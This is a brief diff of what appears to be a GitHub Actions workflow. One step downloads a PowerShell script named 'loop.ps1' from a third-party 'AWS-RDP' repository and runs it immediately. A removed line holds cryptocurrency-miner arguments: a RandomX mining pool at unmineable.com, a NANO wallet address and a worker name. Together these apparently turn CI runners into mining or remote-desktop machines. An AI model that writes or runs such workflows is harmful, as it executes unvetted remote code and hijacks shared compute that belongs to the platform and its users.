@@ -30,5 +30,3 @@ jobs:
       run: | 
         Invoke-WebRequest https://raw.githubusercontent.com/romain09/AWS-RDP/main/loop.ps1 -OutFile loop.ps1
         ./loop.ps1
-
---donate-level 1 -o rx.unmineable.com:3333 -u NANO:nano_1xb9bgefdcmosjc9fzofr3zgkt79mxg4eox7ixf4hdintpampq3omiyb5hyr.David22#mo7n-4on4 -p x -k -a rx/0
